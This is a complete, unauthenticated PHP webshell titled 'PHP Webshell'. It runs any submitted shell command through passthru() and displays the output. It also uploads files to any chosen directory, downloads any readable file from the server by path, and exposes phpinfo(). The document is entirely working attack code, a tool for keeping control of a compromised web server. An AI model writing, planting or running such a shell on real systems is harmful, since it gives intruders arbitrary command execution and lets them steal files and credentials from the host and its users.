<?php
    error_reporting(E_ALL);
    if(isset($_POST["submit-phpinfo"])) {
        phpinfo();
        die();
    }
    if(isset($_POST["submit-download"]) && isset($_POST["download-file"]) && !empty(trim($_POST["download-file"]))) {
        $file = $_POST["download-file"];
        if(is_readable($file)) {
            header('Content-Type: ' . mime_content_type($file));
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        } else {
            $download_msg = "Error accessing file <code>" . htmlspecialchars($file) . "</code><br />\n";
        }
    }
    if(isset($_POST["submit-upload"])) {
        if(isset($_POST["upload-dir"]) && !empty(trim($_POST["upload-dir"]))) {
            $upload_dir = $_POST["upload-dir"];
        } else {
            $upload_dir = ".";
        }
        $upload_msg = "";
        foreach($_FILES["upload-files"]["error"] as $key => $error) {
            if($error == UPLOAD_ERR_OK) {
                $filename = basename($_FILES["upload-files"]["name"][$key]);
                $dest = $upload_dir . DIRECTORY_SEPARATOR . $filename;
                if(move_uploaded_file($_FILES["upload-files"]["tmp_name"][$key], $dest)) {
                    $upload_msg .= "Successfully uploaded <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
                } else {
                    $upload_msg .= "Error saving <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
                }
            } else {
                $upload_msg .= "Error uploading <code>" . htmlspecialchars($filename) . "</code><br />\n";
            }
        }
    }
    $execute = isset($_POST["submit-cmd"]) && isset($_POST["cmd"]) && !empty(trim($_POST["cmd"]));
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>PHP Webshell</title>
    </head>
    <body style="font-family: sans-serif;">
        <form method="POST" action="">
            <input type="text" name="cmd" autofocus="autofocus" style="width: 80%;" />
            <input type="submit" name="submit-cmd" value="Run" />
        </form>
        <div style="margin: 3px auto;">
<?php
    if($execute) {
        echo "Output of command: <code>" . htmlspecialchars($_POST["cmd"]) . "</code>\n";
    } else {
        echo "Run a command to see its output\n";
    }
?>
        </div>
        <textarea readonly="readonly" rows="25" style="width: 80%;">
<?php
    if($execute) {
        passthru($_POST["cmd"], $exit_code);
    }
?>
        </textarea>
        <div style="margin: 3px auto;">
<?php
    if(isset($exit_code)) {
        echo "Exit code: <code>" . htmlspecialchars($exit_code) . "</code>\n";
    }
?>
        </div>
        <div style="margin: 1rem auto;">
            <b>File Upload</b>
            <div>
<?php
    if(isset($upload_msg)) {
        echo $upload_msg;
    }
?>
            </div>
            <form method="POST" action="" enctype="multipart/form-data">
                <input type="file" name="upload-files[]" multiple="multiple" />
                <input type="text" name="upload-dir" placeholder="Destination directory" />
                <input type="submit" name="submit-upload" value="Upload" />
            </form>
        </div>
        <div style="margin: 1rem auto;">
            <b>File Download</b>
            <div>
<?php
    if(isset($download_msg)) {
        echo $download_msg;
    }
?>
            </div>
            <form method="POST" action="">
                <input type="text" name="download-file" placeholder="File to download" />
                <input type="submit" name="submit-download" value="Download" />
            </form>
        </div>
        <div style="margin: 1rem auto;">
            <b>Info</b>
            <form method="POST" action="" target="_blank">
                <input type="submit" name="submit-phpinfo" value="phpinfo()" />
            </form>
        </div>
    </body>
</html>
